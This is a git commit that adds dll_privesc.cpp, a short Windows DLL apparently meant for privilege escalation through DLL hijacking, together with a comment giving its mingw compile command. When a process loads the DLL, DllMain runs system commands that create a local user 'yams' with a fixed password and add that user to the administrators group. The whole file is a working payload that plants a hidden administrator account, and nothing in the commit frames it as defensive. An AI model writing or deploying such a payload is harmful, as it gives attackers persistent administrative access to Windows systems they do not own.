8a651b96701a37257112cf3e4fb3886565fca857
yamsbot <61137924+yamsbot@users.noreply.github.com>
2024-04-24 18:54:44 -0400

    dll_privesc.cpp
    Signed-off-by: yamsbot <61137924+yamsbot@users.noreply.github.com>

---
+++ dll_privesc.cpp
@@ -0,0 +1,26 @@
+#include <stdlib.h>
+#include <windows.h>
+
+// x86_64-w64-mingw32-gcc privesc_dll.cpp --shared -o yams.dll
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+  	    i = system ("net user yams P@ssword123! /add");
+  	    i = system ("net localgroup administrators yams /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
